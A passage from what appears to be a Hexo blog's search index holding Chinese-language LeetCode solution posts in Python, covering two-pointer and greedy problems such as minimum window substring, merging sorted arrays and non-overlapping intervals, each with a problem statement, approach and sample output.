class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minWindow</span><span class="params">(self, s: str, t: str)</span> -&gt; str:</span></span><br><span class="line">        need=collections.defaultdict(int) <span class="comment"># int可以用来计数，重复出现的key，对应值增加1</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> t:</span><br><span class="line">            need[c] += <span class="number">1</span></span><br><span class="line">        needCnt= len(t)</span><br><span class="line">        l=<span class="number">0</span></span><br><span class="line">        res = (<span class="number">0</span>,float(<span class="string">'inf'</span>)) </span><br><span class="line">        <span class="keyword">for</span> r,c <span class="keyword">in</span> enumerate(s):</span><br><span class="line">            <span class="keyword">if</span> need[c]&gt;<span class="number">0</span>:</span><br><span class="line">                needCnt -=<span class="number">1</span></span><br><span class="line">            need[c] -=<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> needCnt==<span class="number">0</span>:<span class="comment"># 步骤一：滑动窗口包含了所有T元素</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 步骤二：增加l,排除多余元素</span></span><br><span class="line">                    c=s[l]</span><br><span class="line">                    <span class="keyword">if</span> need[c]==<span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    need[c] +=<span class="number">1</span></span><br><span class="line">                    l +=<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> r-l&lt;res[<span class="number">1</span>]-res[<span class="number">0</span>]: <span class="comment">#记录结果</span></span><br><span class="line">                    res=(l,r)</span><br><span class="line">                need[s[l]]+=<span class="number">1</span> <span class="comment"># 步骤三：l增加一个位置，寻找新的满足条件滑动窗口</span></span><br><span class="line">                needCnt +=<span class="number">1</span></span><br><span class="line">                l +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span>  <span class="string">''</span> <span class="keyword">if</span> res[<span class="number">1</span>]&gt;len(s) <span class="keyword">else</span> s[res[<span class="number">0</span>]:res[<span class="number">1</span>]+<span class="number">1</span>]    <span class="comment">#如果res始终没被更新过，代表无满足条件的结果</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'ADOBECODEBANC'</span></span><br><span class="line">t = <span class="string">"ABC"</span></span><br><span class="line">a= Solution()</span><br><span class="line">print(a.minWindow(s,t))</span><br></pre></td></tr></table></figure><pre><code>BANC</code></pre><p><strong>复杂度</strong></p><p>我们会用<code>r</code>扫描一遍<code>S</code>，也会用<code>l</code>扫描一遍<code>S</code>，最多扫描2次S，所以时间复杂度是<code>O(n)</code>，空间复杂度为<code>O(k)</code>，k为S和T中的字符集合。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 双指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【双指针】88.合并两个有序数组</title>
      <link href="2021/02/01/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-88.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/"/>
      <url>2021/02/01/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-88.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>三指针</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你两个有序整数数组 nums1 和 nums2，请你将 nums2 合并到 nums1 中，使 nums1 成为一个有序数组。</p><p>初始化 nums1 和 nums2 的元素数量分别为 m 和 n 。你可以假设 nums1 的空间大小等于 m + n，这样它就有足够的空间保存来自 nums2 的元素。</p><p>示例1：</p><pre><code>输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3输出：[1,2,2,3,5,6]</code></pre><p>示例2：</p><pre><code>输入：nums1 = [1], m = 1, nums2 = [], n = 0输出：[1]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><strong>思路</strong></p><p>由于两个数组已经有序，所以两个指针控制m-1和n-1处值，比较两者并将其复制值m+n-1处，当比较一次，m+n-1处前移一次。故需要三个指针指向。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(self, nums1, m, nums2,n)</span> -&gt; <span class="keyword">None</span>:</span> <span class="comment"># nums1：List[int]，nums2:List[int]</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Do not return anything, modify nums1 in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        pos = m+n<span class="number">-1</span></span><br><span class="line">        m -=<span class="number">1</span></span><br><span class="line">        n -=<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> m&gt;=<span class="number">0</span> <span class="keyword">and</span> n&gt;=<span class="number">0</span>:</span><br><span class="line">            <span class="comment">#print(pos,m,n,nums1[m],nums2[n])</span></span><br><span class="line">            <span class="keyword">if</span> nums1[m]&gt;nums2[n]:</span><br><span class="line">                nums1[pos]=nums1[m]</span><br><span class="line">                m -=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                nums1[pos]=nums2[n]</span><br><span class="line">                n -=<span class="number">1</span></span><br><span class="line">            pos -=<span class="number">1</span></span><br><span class="line">            <span class="comment">#print("dddd",nums1)</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;=<span class="number">0</span>:</span><br><span class="line">            nums1[pos]=nums2[n]</span><br><span class="line">            pos -=<span class="number">1</span></span><br><span class="line">            n -=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> nums1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">nums1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">m = <span class="number">3</span></span><br><span class="line">nums2 = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">n = <span class="number">3</span></span><br><span class="line">result = a.merge(nums1,m,nums2,n)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>5 2 2 3 6dddd [1, 2, 3, 0, 0, 6]4 2 1 3 5dddd [1, 2, 3, 0, 5, 6]3 2 0 3 2dddd [1, 2, 3, 3, 5, 6]2 1 0 2 2dddd [1, 2, 2, 3, 5, 6][1, 2, 2, 3, 5, 6]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a= Solution()</span><br><span class="line">nums1 = [<span class="number">0</span>]</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line">nums2 = [<span class="number">1</span>]</span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">result = a.merge(nums1,m,nums2,n)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>[1]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nums1 = [<span class="number">1</span>]</span><br><span class="line">m = <span class="number">1</span></span><br><span class="line">nums2 = []</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">a =Solution()</span><br><span class="line">result =a.merge(nums1,m,nums2,n)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>[1]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 双指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【双指针】167.两数之和II-输入有序数组</title>
      <link href="2021/01/24/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-167.%20%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20II%20-%20%E8%BE%93%E5%85%A5%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/"/>
      <url>2021/01/24/LeetCode-E-%E5%8F%8C%E6%8C%87%E9%92%88-167.%20%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20II%20-%20%E8%BE%93%E5%85%A5%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>双指针</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个已按照升序排列的有序数组，找到两个数使得它们相加之和等于目标数。</p><p>函数应该返回这两个下标值 index1 和 index2，其中 index1 必须小于 index2。</p><p>说明</p><ul><li>返回的下标值（index1 和 index2）不是从零开始的。</li><li>你可以假设每个输入只对应唯一的答案，而且你不可以重复使用相同的元素。</li></ul><p>示例：</p><pre><code>输入: numbers = [2, 7, 11, 15], target = 9输出: [1,2]解释: 2 与 7 之和等于目标数 9 。因此 index1 = 1, index2 = 2 。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><strong>思路</strong></p><p>采用双指针思想，左指针指向最小元素，右指针指向最大元素</p><ul><li>相等时，直接返回</li><li>两者指向和大于目标值，右指针向左移动</li><li>两者指向和小于目标值，左指针向右移动</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, numbers, target)</span>:</span> <span class="comment"># numbers:list[int] ,target:int</span></span><br><span class="line">        l=<span class="number">0</span></span><br><span class="line">        r=len(numbers)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> l&lt;r:</span><br><span class="line">            <span class="keyword">if</span> numbers[l]+numbers[r]==target:</span><br><span class="line">                <span class="keyword">return</span> l+<span class="number">1</span>,r+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> numbers[l]+numbers[r]&gt;target:</span><br><span class="line">                r=r<span class="number">-1</span></span><br><span class="line">            <span class="keyword">if</span> numbers[l]+numbers[r]&lt;target:</span><br><span class="line">                l=l+<span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>]</span><br><span class="line">target = <span class="number">9</span></span><br><span class="line">a= Solution()</span><br><span class="line">result = a.twoSum(numbers,target)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>(1, 2)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 双指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【贪心算法】452.用最少数量的箭引爆气球</title>
      <link href="2021/01/06/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-452.%20%E7%94%A8%E6%9C%80%E5%B0%91%E6%95%B0%E9%87%8F%E7%9A%84%E7%AE%AD%E5%BC%95%E7%88%86%E6%B0%94%E7%90%83(medium)/"/>
      <url>2021/01/06/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-452.%20%E7%94%A8%E6%9C%80%E5%B0%91%E6%95%B0%E9%87%8F%E7%9A%84%E7%AE%AD%E5%BC%95%E7%88%86%E6%B0%94%E7%90%83(medium)/</url>
      
        <content type="html"><![CDATA[<p>贪心策略、排序</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在二维空间中有许多球形的气球。对于每个气球，提供的输入是水平方向上，气球直径的开始和结束坐标。由于它是水平的，所以纵坐标并不重要，因此只要知道开始和结束的横坐标就足够了。开始坐标总是小于结束坐标</p><p>一支弓箭可以沿着 <code>x</code> 轴从不同点完全垂直地射出。在坐标 <code>x</code> 处射出一支箭，若有一个气球的直径的开始和结束坐标为 $x_{start}，x_{end}$， 且满足  $x_{start} ≤ x ≤ x_{end}$，则该气球会被引爆。可以射出的弓箭的数量没有限制。 弓箭一旦被射出之后，可以无限地前进。我们想找到使得所有气球全部被引爆，所需的弓箭的最小数量。</p><p>给你一个数组 <code>points</code> ，其中 $points [i] = [x_{start},x_{end}]$ ，返回引爆所有气球所必须射出的最小弓箭数。</p><p>示例1：</p><pre><code>输入：points = [[10,16],[2,8],[1,6],[7,12]]输出：2解释：对于该样例，x = 6 可以射爆 [2,8],[1,6] 两个气球，以及 x = 11 射爆另外两个气球</code></pre><p>示例2：</p><pre><code>输入：points = [[1,2],[3,4],[5,6],[7,8]]输出：4</code></pre><p>示例3：</p><pre><code>输入：points = [[1,2],[2,3],[3,4],[4,5]]输出：2</code></pre><p>示例4：</p><pre><code>输入：points = [[1,2]]输出：1</code></pre><p>示例5：</p><pre><code>输入：points = [[2,3],[2,3]]输出：1</code></pre><p>提示</p><ul><li>$0&lt;=points.length&lt;=10^4$</li><li>$points[i].length==2$</li><li>$-2^{31}&lt;=x_{start}&lt;x_{end}&lt;=2^{31}-1$</li></ul><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：排序-贪心"><a href="#方法一：排序-贪心" class="headerlink" title="方法一：排序+贪心"></a>方法一：排序+贪心</h3><pre><code>在选择要保留区间时，区间的结尾十分重要：选择的区间结尾越小，余留给其它区间的空间就越大，就越能保留更多的区间。因此，我们采取的贪心策略为，优先保留结尾小且不相交的区间。具体实现方法为，先把区间按照结尾的大小进行增序排序，每次选择结尾最小且和前一个选择的区间不重叠的区间。</code></pre><p>选择右排序，杜绝了前面一个包含后一个区间的情况。初始时，令每个气球都射一箭，当重叠时，总数n减一即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMinArrowShots</span><span class="params">(self, points)</span> -&gt; int:</span></span><br><span class="line">        n=len(points)</span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        new_points=sorted(points,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        a = new_points[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        b = new_points[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">if</span> new_points[i][<span class="number">0</span>]&lt;=b:</span><br><span class="line">                n -=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a=new_points[i][<span class="number">0</span>]</span><br><span class="line">                b=new_points[i][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a =Solution()</span><br><span class="line">points = [[<span class="number">3</span>,<span class="number">9</span>],[<span class="number">7</span>,<span class="number">12</span>],[<span class="number">3</span>,<span class="number">8</span>],[<span class="number">6</span>,<span class="number">8</span>],[<span class="number">9</span>,<span class="number">10</span>],[<span class="number">2</span>,<span class="number">9</span>],[<span class="number">0</span>,<span class="number">9</span>],[<span class="number">3</span>,<span class="number">9</span>],[<span class="number">0</span>,<span class="number">6</span>],[<span class="number">2</span>,<span class="number">8</span>]]</span><br><span class="line">result=a.findMinArrowShots(points)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>2</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【贪心算法】605.种花问题</title>
      <link href="2021/01/05/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-605.%20%E7%A7%8D%E8%8A%B1%E9%97%AE%E9%A2%98(easy)/"/>
      <url>2021/01/05/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-605.%20%E7%A7%8D%E8%8A%B1%E9%97%AE%E9%A2%98(easy)/</url>
      
        <content type="html"><![CDATA[<p>贪心策略、</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花不能种植在相邻的地块上，它们会争夺水源，两者都会死去。</p><p>给你一个整数数组<code>flowerbed</code> 表示花坛，由若干 <code>0</code> 和 <code>1</code> 组成，其中 <code>0</code> 表示没种植花，<code>1</code> 表示种植了花。另有一个数<code>n</code>，能否在不打破种植规则的情况下种入<code>n</code> 朵花？能则返回 <code>true</code> ，不能则返回 <code>false</code>。</p><p>示例1：</p><pre><code>输入：flowerbed = [1,0,0,0,1], n = 1输出：true</code></pre><p>示例2：</p><pre><code>输入：flowerbed = [1,0,0,0,1], n = 2输出：false</code></pre><p>提示：</p><ul><li>$1 &lt;= flowerbed.length &lt;= 2 * 10^4$</li><li>$flowerbed[i] 为 0 或 1$</li><li>$flowerbed 中不存在相邻的两朵花$</li><li>$0 &lt;= n &lt;= flowerbed.length$</li></ul><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：跳格子解法"><a href="#方法一：跳格子解法" class="headerlink" title="方法一：跳格子解法"></a>方法一：跳格子解法</h3><p>题目要求是否能在不打破规则的情况下插入n朵花，与直接计算不同，采用“跳格子”的解法只需遍历不到一遍数组，处理以下两种不同的情况即可：</p><ul><li>【1】当遍历到index遇到1时，说明这个位置有花，那必然从index+2的位置才有可能种花，因此当碰到1时直接跳过下一格</li><li>【2】当遍历到index遇到0时，由于每次碰到1都是跳两格，因此前一格必定是0，此时只需要判断下一格是不是1即可得出index这一格能不能种花，如果能种则令n减一，然后这个位置就按照遇到1时处理，即跳两格；如果index的后一格是1，说明这个位置不能种花且之后两格也不可能种花（参照【1】），直接跳过3格。</li></ul><p>当n减为0时，说明可以种入n朵花，则可以直接退出遍历返回true；如果遍历结束n没有减到0，说明最多种入的花的数量小于n，则返回false。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canPlaceFlowers</span><span class="params">(self, flowerbed, n)</span> -&gt; bool:</span></span><br><span class="line">        </span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> i&lt;len(flowerbed) <span class="keyword">and</span> n&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> flowerbed[i]==<span class="number">1</span>:</span><br><span class="line">                i = i+<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i==len(flowerbed)<span class="number">-1</span> <span class="keyword">or</span> flowerbed[i+<span class="number">1</span>]==<span class="number">0</span>:</span><br><span class="line">                    n=n<span class="number">-1</span></span><br><span class="line">                    i=i+<span class="number">2</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i=i+<span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> n&lt;=<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">flowerbed=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">n=<span class="number">2</span></span><br><span class="line">result=a.canPlaceFlowers(flowerbed,n)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>False</code></pre><h3 id="方法二：贪心"><a href="#方法二：贪心" class="headerlink" title="方法二：贪心"></a>方法二：贪心</h3><p>从左向右遍历花坛，在可以种花的地方就种一朵，能种就种（因为在任一种花时候，不种都不会得到更优解），就是一种贪心的思想</p><p>这里可以种花的条件是：</p><ul><li>自己为空</li><li>左边为空 或者 自己是最左</li><li>右边为空 或者 自己是最右</li></ul><p>最后判断n朵花是否有剩余，为了效率起见，可以在种花的过程中做判断，一旦花被种完就返回true</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canPlaceFlowers</span><span class="params">(self, flowerbed, n)</span> -&gt; bool:</span></span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i&lt;len(flowerbed) <span class="keyword">and</span> n&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> flowerbed[i]==<span class="number">0</span> <span class="keyword">and</span> (i==<span class="number">0</span> <span class="keyword">or</span> flowerbed[i<span class="number">-1</span>]==<span class="number">0</span> ) <span class="keyword">and</span> (i==len(flowerbed)<span class="number">-1</span> <span class="keyword">or</span> flowerbed[i+<span class="number">1</span>]==<span class="number">0</span>):</span><br><span class="line">                n=n<span class="number">-1</span></span><br><span class="line">                flowerbed[i]=<span class="number">1</span></span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> n&lt;=<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=Solution()</span><br><span class="line">flowerbed=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">n=<span class="number">2</span></span><br><span class="line">result=a.canPlaceFlowers(flowerbed,n)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><pre><code>False</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【贪心算法】435.无重叠区间</title>
      <link href="2021/01/04/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-435.%20%E6%97%A0%E9%87%8D%E5%8F%A0%E5%8C%BA%E9%97%B4/"/>
      <url>2021/01/04/LeetCode-D-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-435.%20%E6%97%A0%E9%87%8D%E5%8F%A0%E5%8C%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>贪心策略、区间问题</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。</p><p>注意:</p><ul><li>可以认为区间的终点总是大于它的起点。</li><li>区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。</li></ul><p>示例1：</p><pre><code>输入: [ [1,2], [2,3], [3,4], [1,3] ]输出: 1解释: 移除 [1,3] 后，剩下的区间没有重叠。</code></pre><p>示例2：</p><pre><code>输入: [ [1,2], [1,2], [1,2] ]输出: 2解释: 你需要移除两个 [1,2] 来使剩下的区间没有重叠。</code></pre><p>示例3：</p><pre><code>输入: [ [1,2], [2,3] ]输出: 0解释: 你不需要移除任何区间，因为它们已经是无重叠的了。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：贪心策略"><a href="#方法一：贪心策略" class="headerlink" title="方法一：贪心策略"></a>方法一：贪心策略</h3><pre><code>在选择要保留区间时，区间的结尾十分重要：选择的区间结尾越小，余留给其它区间的空间就越大，就越能保留更多的区间。因此，我们采取的贪心策略为，优先保留结尾小且不相交的区间。具体实现方法为，先把区间按照结尾的大小进行增序排序，每次选择结尾最小且和前一个选择的区间不重叠的区间。1  21   3   2   41         5   最后剩1  2  2   4</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eraseOverlapIntervals</span><span class="params">(self, intervals)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(intervals)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">        new_intervals=sorted(intervals,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line">        ret=<span class="number">0</span></span><br><span class="line">        a = new_intervals[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        b = new_intervals[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(intervals)):</span><br><span class="line">            <span class="keyword">if</span> new_intervals[i][<span class="number">0</span>]&lt;b:</span><br><span class="line">                ret+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = new_intervals[i][<span class="number">0</span>]</span><br><span class="line">                b = new_intervals[i][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = Solution()</span><br><span class="line">intervals=[ [<span class="number">1</span>,<span 